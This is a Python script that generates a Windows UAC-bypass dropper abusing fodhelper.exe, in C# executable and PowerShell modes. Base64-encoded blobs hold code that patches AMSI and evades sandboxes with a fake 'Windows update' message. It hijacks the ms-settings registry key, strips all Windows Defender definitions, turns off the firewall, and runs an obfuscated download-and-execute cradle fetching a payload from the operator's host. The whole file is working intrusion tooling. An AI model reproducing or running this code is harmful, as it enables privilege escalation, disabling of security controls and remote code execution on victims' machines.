import os
import base64
import argparse
from random import choice
from makerunner import runner,powershell_b64encode,cradleps1

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal, leave "0" by default since normal user will already use proxy
proxy_steal = "0" #"0" #"1" #only use when in SYSTEM powershell shell

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def copy(runfilename,payfilepath,payfilename):
    os.system("cp %s %s%s" % (runfilename,payfilepath,payfilename))
    print ('[+] %s copied to %s%s' % (runfilename,payfilepath,payfilename))
    pass

def chararray(cmdstring):
    res = [str(ord(c)) for c in cmdstring]
    #print (res)
    return res
    pass

def writefodhelper(lhost,mode):
    if mode == "exe":
        upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGhyZWFkaW5nOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLk5ldDsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIE1pY3Jvc29mdC5XaW4zMjsKCm5hbWVzcGFjZSBVQUNIZWxwZXIKewogICAgY2xhc3MgUHJvZ3JhbQogICAgewogICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgTWVzc2FnZUJveChJbnRQdHIgaFduZCwgU3RyaW5nIHRleHQsIFN0cmluZyBjYXB0aW9uLCBpbnQgb3B0aW9ucyk7CiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY05hbWUpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBWaXJ0dWFsUHJvdGVjdChJbnRQdHIgbHBBZGRyZXNzLCBVSW50MzIgZHdTaXplLCBVSW50MzIgZmxOZXdQcm90ZWN0LCBvdXQgVUludDMyIGxwZmxPbGRQcm90ZWN0KTsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIsIEVudHJ5UG9pbnQgPSAiUnRsTW92ZU1lbW9yeSIsIFNldExhc3RFcnJvciA9IGZhbHNlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIHZvaWQgTW92ZU1lbW9yeShJbnRQdHIgZGVzdCwgSW50UHRyIHNyYywgaW50IHNpemUpOwogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgICAgIHN0YXRpYyBleHRlcm4gdm9pZCBTbGVlcCh1aW50IGR3TWlsbGlzZWNvbmRzKTsKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4TnVtYShJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEFkZHJlc3MsIHVpbnQgZHdTaXplLCBVSW50MzIgZmxBbGxvY2F0aW9uVHlwZSwgVUludDMyIGZsUHJvdGVjdCwgVUludDMyIG5uZFByZWZlcnJlZCk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDdXJyZW50UHJvY2VzcygpOwogICAgICAgIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJXaW5kb3dzIHVwZGF0ZSBkb3dubG9hZCBjb21wbGV0ZS4gUHJlcGFyaW5nIHRvIGNvbmZpZ3VyZSBXaW5kb3dzLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKICAgICAgICAgICAgSW50UHRyIG1lbSA9IFZpcnR1YWxBbGxvY0V4TnVtYShHZXRDdXJyZW50UHJvY2VzcygpLCBJbnRQdHIuWmVybywgMHgxMDAwLCAweDMwMDAsIDB4NCwgMCk7CiAgICAgICAgICAgIGlmIChtZW0gPT0gbnVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CgogICAgICAgICAgICBEYXRlVGltZSB0MSA9IERhdGVUaW1lLk5vdzsKICAgICAgICAgICAgU2xlZXAoMTAwMDApOwogICAgICAgICAgICBkb3VibGUgZGVsdGFUID0gRGF0ZVRpbWUuTm93LlN1YnRyYWN0KHQxKS5Ub3RhbFNlY29uZHM7CiAgICAgICAgICAgIGlmIChkZWx0YVQgPCA5LjUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy9hbnRpaGV1cjogY29udGFjdCBmYWtlIHVybCBhbmQgc2VlIGlmIHN0YXR1cyBhY3R1YWxseSByZXR1cm5lZCBvawogICAgICAgICAgICBzdHJpbmcgdXJsID0gImh0dHA6Ly93b2x0cmFtYXBsaGEuY29tIjsKICAgICAgICAgICAgLy9zdHJpbmcgdXJsID0gImh0dHBzOi8vZ29vZ2xlLmNvbSI7IC8vdGVzdAogICAgICAgICAgICAvLyBDcmVhdGVzIGFuIEh0dHBXZWJSZXF1ZXN0IGZvciB0aGUgc3BlY2lmaWVkIFVSTC4KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIEh0dHBXZWJSZXF1ZXN0IG15SHR0cFdlYlJlcXVlc3QgPSAoSHR0cFdlYlJlcXVlc3QpV2ViUmVxdWVzdC5DcmVhdGUodXJsKTsKICAgICAgICAgICAgICAgIC8vIFNlbmRzIHRoZSBIdHRwV2ViUmVxdWVzdCBhbmQgd2FpdHMgZm9yIGEgcmVzcG9uc2UuCiAgICAgICAgICAgICAgICBIdHRwV2ViUmVzcG9uc2UgbXlIdHRwV2ViUmVzcG9uc2UgPSAoSHR0cFdlYlJlc3BvbnNlKW15SHR0cFdlYlJlcXVlc3QuR2V0UmVzcG9uc2UoKTsKICAgICAgICAgICAgICAgIGlmIChteUh0dHBXZWJSZXNwb25zZS5TdGF0dXNDb2RlID09IEh0dHBTdGF0dXNDb2RlLk9LKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vIFJlbGVhc2VzIHRoZSByZXNvdXJjZXMgb2YgdGhlIHJlc3BvbnNlLgogICAgICAgICAgICAgICAgbXlIdHRwV2ViUmVzcG9uc2UuQ2xvc2UoKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiQ29uZmlndXJpbmcgV2luZG93cy4uLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy9hbnRpaGV1cjogbG9vcCA5MDAgbWlsbGlvbiB0aW1lcyBhbmQgc2VlIGlmIHRoZSBsb29wIHJlYWxseSBoYXBwZW5lZAogICAgICAgICAgICBpbnQgY291bnQgPSAwOwogICAgICAgICAgICBpbnQgbWF4ID0gOTAwMDAwMDAwOwogICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IG1heDsgaSsrKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBjb3VudCsrOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChjb3VudCAhPSBtYXgpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQogICAgICAgICAgICBydW5uZXIoKTsKICAgICAgICB9CgogICAgICAgIHN0YXRpYyB2b2lkIHJ1bm5lcigpCiAgICAgICAgeyAKICAgICAgICAgICAgLy93cmVjayBhbXNpCiAgICAgICAgICAgIHN0cmluZyBuYW1lMSA9ICJhIiArICJtc2kiICsgIi5kbGwiOwogICAgICAgICAgICBzdHJpbmcgbmFtZTIgPSAiQSIgKyAibXNpIiArICJTY2FuQiIgKyAidWZmZXIiOwogICAgICAgICAgICBJbnRQdHIgVGFyZ2V0RExMID0gTG9hZExpYnJhcnkobmFtZTEpOwogICAgICAgICAgICBJbnRQdHIgTWltaVB0ciA9IEdldFByb2NBZGRyZXNzKFRhcmdldERMTCwgbmFtZTIpOwogICAgICAgICAgICBVSW50MzIgb2xkUHJvdGVjdCA9IDA7CiAgICAgICAgICAgIEJ5dGVbXSBidWZpID0geyAweDQ4LCAweDMxLCAweEMwIH07CiAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0KE1pbWlQdHIsIDMsIDB4NDAsIG91dCBvbGRQcm90ZWN0KTsKICAgICAgICAgICAgTWFyc2hhbC5Db3B5KGJ1ZmksIDAsIE1pbWlQdHIsIGJ1ZmkuTGVuZ3RoKTsKICAgICAgICAgICAgVmlydHVhbFByb3RlY3QoTWltaVB0ciwgMywgMHgyMCwgb3V0IG9sZFByb3RlY3QpOwoKICAgICAgICAgICAgLy9ydW5kbGwzMiBTSEVMTDMyLkRMTCxTaGVsbEV4ZWNfUnVuRExMICJjbWQiICIvYyBwXm9ed15lXnJzXmheZV5sbC5leGUgaWV4KChuZXctb2JqZWN0IG5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZyhbY2hhcltdXUAoMTA0ICwgMTE2ICwxMTYgLDExMiAsNTgsNDcgLCA0NywgNDkgLDU3LCA1MCwgNDYsNDksIDU0ICwgNTYsNDYgLDQ5ICw1MSw1MyAsNDYsIDU1ICw0NywxMTQsMTE3LCAxMTAsIDQ2LCAxMTYgLCAxMjAgLDExNikpKSki"
        lower = "ICAgICAgICAgICAgc3RyaW5nIGNvbW1hbmQgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhkYXRhKTsKCiAgICAgICAgICAgIFJlZ2lzdHJ5S2V5IG5ld2tleSA9IFJlZ2lzdHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXkoQCJTb2Z0d2FyZVxDbGFzc2VzXCIsIHRydWUpOwogICAgICAgICAgICBuZXdrZXkuQ3JlYXRlU3ViS2V5KEAibXMtc2V0dGluZ3NcU2hlbGxcT3Blblxjb21tYW5kIik7CgogICAgICAgICAgICBSZWdpc3RyeUtleSBmb2QgPSBSZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3ViS2V5KEAiU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQiLCB0cnVlKTsKICAgICAgICAgICAgZm9kLlNldFZhbHVlKCJEZWxlZ2F0ZUV4ZWN1dGUiLCAiIik7CiAgICAgICAgICAgIGZvZC5TZXRWYWx1ZSgiIiwgQGNvbW1hbmQpOwogICAgICAgICAgICBmb2QuQ2xvc2UoKTsKCiAgICAgICAgICAgIFByb2Nlc3MgcCA9IG5ldyBQcm9jZXNzKCk7CiAgICAgICAgICAgIHAuU3RhcnRJbmZvLldpbmRvd1N0eWxlID0gUHJvY2Vzc1dpbmRvd1N0eWxlLkhpZGRlbjsKICAgICAgICAgICAgcC5TdGFydEluZm8uRmlsZU5hbWUgPSAiQzpcXHdpbmRvd3NcXHN5c3RlbTMyXFxmb2RoZWxwZXIuZXhlIjsKICAgICAgICAgICAgcC5TdGFydCgpOwoKICAgICAgICAgICAgVGhyZWFkLlNsZWVwKDEwMDAwKTsKCiAgICAgICAgICAgIG5ld2tleS5EZWxldGVTdWJLZXlUcmVlKCJtcy1zZXR0aW5ncyIpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIC8vTWVzc2FnZUJveChJbnRQdHIuWmVybywgY29tbWFuZC5Ub1N0cmluZygpLCAiVGhpcyBpcyBteSBjYXB0aW9uIiwgMCk7CiAgICAgICAgfQogICAgfQp9Cg=="

        fodfilename = "UACHelper.cs"
        runfilename = "run.txt"

        cradle = "$wc = (new-object system.net.webclient);"
        if proxy_kill == "1":
            cradle += "$wc.proxy = $null;"
        if custom_agent == "1":
            cradle += "$wc.headers.add('User-Agent','%s');" % agent_string
        if proxy_steal == "1":
            cradle += "New-PSDrive -NAME HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;$keys = gci \'HKU:\\\';ForEach ($key in $keys) {if ($key.Name -like \"*S-1-5-21-*\") {$start = $key.Name.substring(10);break}};$proxyAddr = (Get-ItemProperty -Path \"HKU:$start\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\").ProxyServer;"
            cradle += "[system.net.webrequest]::DefaultWebProxy = new-object system.net.webproxy(\"http://$proxyAddr\");" #note: assuming proxy over http, not https
        cradle += "iex($wc.downloadstring('%s'))"

        #//rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd" "/c p^o^w^e^rs^h^e^ll.exe iex((new-object net.webclient).downloadstring([System.Text.Encoding]::ASCII.GetString([char[]]@(104 , 116 ,116 ,112 ,58,47 , 47, 49 ,57, 50, 46,49, 54 , 56,46 ,49 ,51,53 ,46, 55 ,47,114,117, 110, 46, 116 , 120 ,116))))"
        target = "http://%s/%s" % (lhost,runfilename)
        target = cradle % target
        #print (target)
        chars = chararray(target)
        chars = ", ".join(chars)

        base = "rundll32 SHELL32.DLL,ShellExec_RunDLL \"cmd\" \"/c p^o^w^e^rs^h^e^ll.exe iex([System.Text.Encoding]::ASCII.GetString([char[]]@(%s)))\""
        base = base % chars
        base_b64 = base64.b64encode(base.encode()).decode()
        #print (base)

        data = "byte[] data = Convert.FromBase64String(\"%s\");" % base_b64

        with open(fodfilename,'w') as f:
            upper = base64.b64decode(upper).decode()
            lower = base64.b64decode(lower).decode()
            f.write(upper + "\n")
            f.write("\t\t\t" + data + "\n")
            f.write(lower)
        f.close()

        print('[+] fodhelper cs written: %s' % fodfilename)
    if mode == "ps1":
        upper = "JGE9W1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTtGb3JFYWNoKCRiIGluICRhKSB7aWYgKCRiLk5hbWUgLWxpa2UgJyppVXRpbHMnKSB7JGM9JGJ9fTskZD0kYy5HZXRGaWVsZHMoJ05vblB1YmxpYyxTdGF0aWMnKTtGb3JFYWNoKCRlIGluICRkKSB7aWYgKCRlLk5hbWUgLWxpa2UgJypDb250ZXh0JykgeyRmPSRlfX07JGc9JGYuR2V0VmFsdWUoJG51bGwpO1tJbnRQdHJdJHB0cj0kZztbSW50MzJbXV0kYnVmPUAoMCk7W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkYnVmLCAwLCAkcHRyLCAxKQoKc3RhcnQtcHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtYXJndW1lbnRsaXN0ICJ3aGlsZSgxKXsmICdDOlxQcm9ncmFtIEZpbGVzXFdpbmRvd3MgRGVmZW5kZXJcTXBDbWRSdW4uZXhlJyAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbDtzdGFydC1zbGVlcCAtc2Vjb25kcyAzMDB9IiAtd2luZG93c3R5bGUgaGlkZGVuCgomICdDOlxQcm9ncmFtIEZpbGVzXFdpbmRvd3MgRGVmZW5kZXJcTXBDbWRSdW4uZXhlJyAtUmVtb3ZlRGVmaW5pdGlvbnMgLUFsbA=="
        killfw = "bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZg=="
        lower = "ZnVuY3Rpb24gU2V0eiB7CiAgICBjb3B5IGM6XHdpbmRvd3Ncc3lzdGVtMzJcd2luZG93c3Bvd2Vyc2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSBjOlx3aW5kb3dzXHRhc2tzXGZvby5leGUKICAgIFJlbW92ZS1JdGVtICJIS0NVOlxTb2Z0d2FyZVxDbGFzc2VzXG1zLXNldHRpbmdzXCIgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBOZXctSXRlbSAiSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQiIC1Gb3JjZQogICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQiIC1OYW1lICJEZWxlZ2F0ZUV4ZWN1dGUiIC1WYWx1ZSAiIiAtRm9yY2UKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNvZnR3YXJlXENsYXNzZXNcbXMtc2V0dGluZ3NcU2hlbGxcT3Blblxjb21tYW5kIiAtTmFtZSAiKGRlZmF1bHQpIiAtVmFsdWUgJENvbW1hbmQgLUZvcmNlCn0KCmZ1bmN0aW9uIEJvb216IHsKICAgIFN0YXJ0LVByb2Nlc3MgIkM6XFdpbmRvd3NcU3lzdGVtMzJcZm9kaGVscGVyLmV4ZSIgLVdpbmRvd1N0eWxlIEhpZGRlbgogICAgU3RhcnQtU2xlZXAgLXMgNQogICAgUmVtb3ZlLUl0ZW0gIkhLQ1U6XFNvZnR3YXJlXENsYXNzZXNcbXMtc2V0dGluZ3NcIiAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKfQpTZXR6CkJvb216"

        fodfilename = "fod.txt"
        runnerfilename = "run.txt"
        randexename = rand_word()

        fcradle,cradle = cradleps1(lhost,runnerfilename)
        target = "http://%s/%s" % (lhost,runnerfilename)
        target = cradle % target
        binargs = " -Win hidden -nonI -noP -Exe ByPass -ENC %s" % powershell_b64encode(target)
        binname = "c:\\windows\\tasks\\%s.exe" % randexename
        binary = "%s%s" % (binname,binargs)

        base_b64 = None

        data = "$Command = \"%s\"" % binary

        with open(fodfilename,'w') as f:
            upper = base64.b64decode(upper).decode()
            killfw = base64.b64decode(killfw).decode()
            lower = base64.b64decode(lower).decode()
            lower = lower.replace("foo",randexename)
            f.write(upper + "\n")
            f.write(killfw + "\n")
            f.write(data + "\n")
            f.write(lower)
        f.close()

        print('[+] fodhelper ps1 written: %s' % fodfilename)
        pass
    return fodfilename,base_b64
    pass

def makefodhelper(bitness,lhost,lport,mode):
    runner(lhost,lport,bitness)
    fodfilename,cmdstring_b64 = writefodhelper(lhost,mode)
    if mode == "exe":
        fodfilepath = "/home/kali/data/UACHelper/UACHelper/"
        exefilename = "UACHelper.exe"
        exewebroot = "/var/www/html/"
        copy(fodfilename,fodfilepath,"Program.cs")
        input("[!] build %s%s with bitness %s .. press enter to continue\n" % (fodfilepath,"Program.cs",bitness))
        if bitness == "64":
            copy("%sbin/x64/Release/%s" % (fodfilepath,exefilename),exewebroot,exefilename)
        if bitness == "32":
            copy("%sbin/x86/Release/%s" % (fodfilepath,exefilename),exewebroot,exefilename)
    if mode == "ps1":
        copy(fodfilename,"/var/www/html/",fodfilename)
        print('[*] usage:\niex(new-object net.webclient).downloadstring(\'http://%s/%s\')' % (lhost,fodfilename))
        pass
    print('[!] warning - fodhelper usually only works once! use with caution!')
    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--mode','-m',required=False,dest='mode',help='exe or ps1')
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    mode = args.mode

    if mode == None:
        mode = "0"

    if mode == "0":
        print('[*] default mode used: exe')
        mode = "exe"
    if mode == "ps1":
        print('[*] -m ps1 powershell mode used!')

    makefodhelper(bitness,lhost,lport,mode)